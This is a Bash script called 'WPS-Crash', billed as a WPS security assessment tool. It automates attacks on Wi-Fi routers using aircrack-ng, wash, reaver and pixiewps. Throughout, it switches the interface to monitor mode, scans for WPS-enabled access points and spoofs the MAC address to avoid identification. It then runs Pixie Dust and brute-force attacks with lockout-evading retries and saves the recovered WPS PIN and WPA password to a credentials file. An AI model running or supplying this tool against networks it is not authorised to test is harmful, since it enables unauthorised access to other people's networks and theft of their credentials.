#!/bin/bash

# WPS-Crash: Advanced WPS Security Assessment Tool
# Author: @0xtz
# License: MIT

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Output files and directories
LOG_DIR="logs"
ARCHIVE_DIR="$LOG_DIR/archive"
LOG_FILE="$LOG_DIR/wps_attack_results.log"
SCAN_FILE="$LOG_DIR/wps_scan.txt"
CREDS_FILE="$LOG_DIR/discovered_credentials.txt"

# Setup logging directories
setup_logging() {
    mkdir -p "$LOG_DIR" "$ARCHIVE_DIR"
    # Archive old logs if they exist
    if [ -f "$LOG_FILE" ]; then
        timestamp=$(date +%Y%m%d_%H%M%S)
        mv "$LOG_FILE" "$ARCHIVE_DIR/wps_attack_$timestamp.log"
        mv "$SCAN_FILE" "$ARCHIVE_DIR/wps_scan_$timestamp.txt" 2>/dev/null
    fi
    touch "$LOG_FILE" "$CREDS_FILE"
}

# Enhanced error handling with retry logic
handle_error() {
    local error_msg="$1"
    local exit_flag="$2"
    local retry_flag="$3"

    echo -e "${RED}[!] Error: $error_msg${NC}" | tee -a "$LOG_FILE"

    if [ "$retry_flag" = "retry" ]; then
        echo -e "${YELLOW}[*] Waiting 60 seconds before retrying...${NC}"
        sleep 60
        return 1
    elif [ "$exit_flag" = "exit" ]; then
        cleanup
        exit 1
    fi
}

# Enhanced WPS lock detection
check_wps_lock() {
    local output="$1"
    if echo "$output" | grep -qi "WPS lockdown" || echo "$output" | grep -qi "Receive timeout"; then
        return 0  # locked
    fi
    return 1  # not locked
}

# Improved Pixie Dust success detection
check_pixie_success() {
    local output="$1"
    if echo "$output" | grep -qi "WPS PIN:" || \
       echo "$output" | grep -qi "WPA PSK:" || \
       echo "$output" | grep -qi "PIN found:" || \
       echo "$output" | grep -qi "Successfully connected"; then
        return 0  # success
    fi
    return 1  # failed
}

# Banner function
print_banner() {
    echo -e "${BLUE}"
    echo "██╗    ██╗██████╗ ███████╗       ██████╗██████╗  █████╗ ███████╗██╗  ██╗"
    echo "██║    ██║██╔══██╗██╔════╝      ██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║"
    echo "██║ █╗ ██║██████╔╝███████╗█████╗██║     ██████╔╝███████║███████╗███████║"
    echo "██║███╗██║██╔═══╝ ╚════██║╚════╝██║     ██╔══██╗██╔══██║╚════██║██╔══██║"
    echo "╚███╔███╔╝██║     ███████║      ╚██████╗██║  ██║██║  ██║███████║██║  ██║"
    echo " ╚══╝╚══╝ ╚═╝     ╚══════╝       ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝"
    echo -e "${NC}"
    echo -e "${YELLOW}[*] Advanced WPS Security Assessment Tool${NC}"
    echo -e "${YELLOW}[*] Version 0.0.1 ${NC}\n"
}

# Cleanup function
cleanup() {
    echo -e "\n${YELLOW}[*] Performing cleanup...${NC}"
    sudo airmon-ng stop "$MON_IF" 2>/dev/null
    sudo service NetworkManager restart

    # Compress logs if attack was successful
    if grep -q "WPS PIN:" "$LOG_FILE"; then
        timestamp=$(date +%Y%m%d_%H%M%S)
        tar -czf "$ARCHIVE_DIR/successful_attack_$timestamp.tar.gz" "$LOG_FILE" "$SCAN_FILE" "$CREDS_FILE" 2>/dev/null
    fi
}

# Save credentials function
save_credentials() {
    local bssid="$1"
    local pin="$2"
    local password="$3"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')

    echo "----------------------------------------" >> "$CREDS_FILE"
    echo "Timestamp: $timestamp" >> "$CREDS_FILE"
    echo "BSSID: $bssid" >> "$CREDS_FILE"
    echo "WPS PIN: $pin" >> "$CREDS_FILE"
    echo "Password: $password" >> "$CREDS_FILE"
    echo "----------------------------------------" >> "$CREDS_FILE"
}

# Signal handler
trap cleanup SIGINT SIGTERM

# Start main script
print_banner

# Check for root privileges
if [[ $EUID -ne 0 ]]; then
    handle_error "This script must be run as root!" "exit"
fi

# Function to install missing dependencies
install_dependencies() {
    local missing_deps=("$@")
    echo -e "${YELLOW}[*] The following dependencies are missing:${NC}"
    printf '%s\n' "${missing_deps[@]}" | sed 's/^/  - /'

    read -p "Would you like to install them now? [Y/n] " choice
    choice=${choice:-Y}  # Default to Yes if empty

    case "$choice" in
        [Yy]*)
            echo -e "${YELLOW}[*] Installing missing dependencies...${NC}"
            if command -v apt-get &>/dev/null; then
                # For Debian/Ubuntu based systems
                sudo apt-get update
                sudo apt-get install -y "${missing_deps[@]}"
            elif command -v pacman &>/dev/null; then
                # For Arch based systems
                sudo pacman -Sy --noconfirm "${missing_deps[@]}"
            elif command -v dnf &>/dev/null; then
                # For Fedora based systems
                sudo dnf install -y "${missing_deps[@]}"
            else
                echo -e "${RED}[!] Unsupported package manager. Please install dependencies manually:${NC}"
                printf '%s\n' "${missing_deps[@]}"
                exit 1
            fi

            # Verify installation
            local failed_deps=()
            for dep in "${missing_deps[@]}"; do
                if ! command -v "$dep" &>/dev/null; then
                    failed_deps+=("$dep")
                fi
            done

            if [ ${#failed_deps[@]} -eq 0 ]; then
                echo -e "${GREEN}[+] All dependencies installed successfully!${NC}"
                return 0
            else
                echo -e "${RED}[!] Failed to install: ${failed_deps[*]}${NC}"
                exit 1
            fi
            ;;
        [Nn]*)
            echo -e "${RED}[!] Dependencies required. Exiting.${NC}"
            exit 1
            ;;
        *)
            echo -e "${RED}[!] Invalid choice. Exiting.${NC}"
            exit 1
            ;;
    esac
}

# Enhanced dependencies check with version logging
echo -e "${YELLOW}[*] Checking dependencies...${NC}"
declare -a dependencies=("aircrack-ng" "reaver" "wash" "macchanger" "bully" "pixiewps")
declare -a missing_deps=()

for dep in "${dependencies[@]}"; do
    if ! command -v "$dep" &>/dev/null; then
        missing_deps+=("$dep")
    else
        version=$($dep --version 2>&1 | head -n1)
        echo -e "${GREEN}[+] $dep found: $version${NC}" | tee -a "$LOG_FILE"
    fi
done

# If there are missing dependencies, try to install them
if [ ${#missing_deps[@]} -gt 0 ]; then
    install_dependencies "${missing_deps[@]}"

    # After installation, log versions of newly installed packages
    for dep in "${missing_deps[@]}"; do
        if command -v "$dep" &>/dev/null; then
            version=$($dep --version 2>&1 | head -n1)
            echo -e "${GREEN}[+] $dep installed: $version${NC}" | tee -a "$LOG_FILE"
        fi
    done
fi

# Select wireless interface
echo -e "\n${YELLOW}[*] Available wireless interfaces:${NC}"
iw dev | awk '$1=="Interface"{print "- "$2}'
read -p "Enter interface name to use: " INTERFACE

# Validate interface
if ! iw dev | grep -q "Interface $INTERFACE"; then
    handle_error "Invalid interface: $INTERFACE" "exit"
fi

# Enable monitor mode
echo -e "\n${YELLOW}[*] Enabling monitor mode...${NC}"
sudo airmon-ng check kill >/dev/null
sudo airmon-ng start "$INTERFACE" | tee -a "$LOG_FILE"
MON_IF="${INTERFACE}mon"

# Scan for WPS-enabled networks
echo -e "\n${YELLOW}[*] Scanning for WPS-enabled networks (30 seconds)...${NC}"
timeout 30 sudo wash -i "$MON_IF" -o "$SCAN_FILE" --ignore-fcs 2>/dev/null
echo -e "${GREEN}[+] Scan complete. Results saved to $SCAN_FILE${NC}"

# Display scan results
echo -e "\n${YELLOW}[*] WPS-enabled networks found:${NC}"
cat "$SCAN_FILE"

# Get target BSSID
read -p $'\nEnter target BSSID: ' BSSID

# Validate BSSID format
if ! echo "$BSSID" | grep -E "^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$" >/dev/null; then
    handle_error "Invalid BSSID format" "exit"
fi

# Change MAC address
echo -e "\n${YELLOW}[*] Changing MAC address...${NC}"
sudo macchanger -r "$MON_IF" | tee -a "$LOG_FILE"

# Enhanced attack modes
echo -e "\n${YELLOW}[*] Select attack mode:${NC}"
echo "1) Reaver bruteforce"
echo "2) Pixie Dust attack"
echo "3) Both (recommended)"
echo "4) Advanced mode (multiple attempts with delay)"
read -p "Choice [1-4]: " attack_choice

# Function to perform Pixie Dust attack with retry logic
perform_pixie_dust() {
    local max_attempts=3
    local attempt=1
    local success=false

    while [ $attempt -le $max_attempts ] && [ "$success" = false ]; do
        echo -e "${YELLOW}[*] Pixie Dust attempt $attempt of $max_attempts${NC}"

        pixie_output=$(sudo reaver -i "$MON_IF" -b "$BSSID" -K 1 -vv -l 2 -N 2>&1 | tee -a "$LOG_FILE")

        if check_pixie_success "$pixie_output"; then
            success=true
            echo -e "${GREEN}[+] Pixie Dust attack successful!${NC}"
            return 0
        elif check_wps_lock "$pixie_output"; then
            echo -e "${YELLOW}[*] WPS locked detected. Waiting 60 seconds...${NC}"
            sleep 60
        fi

        ((attempt++))
        [ $attempt -le $max_attempts ] && echo -e "${YELLOW}[*] Retrying...${NC}"
    done

    return 1
}

# Function to perform bruteforce attack with retry logic
perform_bruteforce() {
    local max_attempts=2
    local attempt=1

    while [ $attempt -le $max_attempts ]; do
        echo -e "${YELLOW}[*] Bruteforce attempt $attempt of $max_attempts${NC}"

        reaver_output=$(sudo reaver -i "$MON_IF" -b "$BSSID" -vv -S -N -d 0 -T 2 -r 3:15 -l 2 2>&1 | tee -a "$LOG_FILE")

        if echo "$reaver_output" | grep -q "WPS PIN:"; then
            return 0
        elif check_wps_lock "$reaver_output"; then
            echo -e "${YELLOW}[*] WPS locked detected. Waiting 120 seconds...${NC}"
            sleep 120
        fi

        ((attempt++))
        [ $attempt -le $max_attempts ] && echo -e "${YELLOW}[*] Retrying...${NC}"
    done

    return 1
}

case $attack_choice in
    1)
        echo -e "\n${YELLOW}[*] Starting Reaver bruteforce attack...${NC}"
        perform_bruteforce
        ;;
    2)
        echo -e "\n${YELLOW}[*] Starting Pixie Dust attack...${NC}"
        perform_pixie_dust
        ;;
    3)
        echo -e "\n${YELLOW}[*] Starting combined attack...${NC}"
        if ! perform_pixie_dust; then
            echo -e "\n${YELLOW}[*] Pixie Dust failed, starting bruteforce attack...${NC}"
            perform_bruteforce
        fi
        ;;
    4)
        echo -e "\n${YELLOW}[*] Starting advanced mode...${NC}"
        read -p "Enter number of attempts (1-10): " num_attempts
        read -p "Enter delay between attempts in seconds (60-300): " delay_time

        if ! [[ "$num_attempts" =~ ^[1-9]|10$ ]] || ! [[ "$delay_time" =~ ^[6-9][0-9]|[1-2][0-9][0-9]|300$ ]]; then
            handle_error "Invalid input values" "exit"
        fi

        for ((i=1; i<=num_attempts; i++)); do
            echo -e "\n${YELLOW}[*] Advanced attempt $i of $num_attempts${NC}"

            if perform_pixie_dust; then
                break
            elif [ $i -lt $num_attempts ]; then
                echo -e "${YELLOW}[*] Waiting $delay_time seconds before next attempt...${NC}"
                sleep "$delay_time"
            fi
        done
        ;;
    *)
        handle_error "Invalid choice" "exit"
        ;;
esac

# Extract and save credentials if found
if grep -q "WPS PIN:" "$LOG_FILE"; then
    pin=$(grep "WPS PIN:" "$LOG_FILE" | tail -1 | awk '{print $NF}')
    password=$(grep "WPA PSK:" "$LOG_FILE" | tail -1 | awk '{print $NF}')
    echo -e "\n${GREEN}[+] Attack successful!${NC}"
    echo -e "${GREEN}[+] WPS PIN: $pin${NC}"
    echo -e "${GREEN}[+] WPA Password: $password${NC}"
    save_credentials "$BSSID" "$pin" "$password"
    echo -e "${GREEN}[+] Credentials saved to $CREDS_FILE${NC}"
else
    echo -e "\n${RED}[!] No credentials found in this attempt${NC}"
fi

# Cleanup
cleanup
echo -e "\n${GREEN}[+] Attack completed. Check $LOG_FILE and $CREDS_FILE for results${NC}"

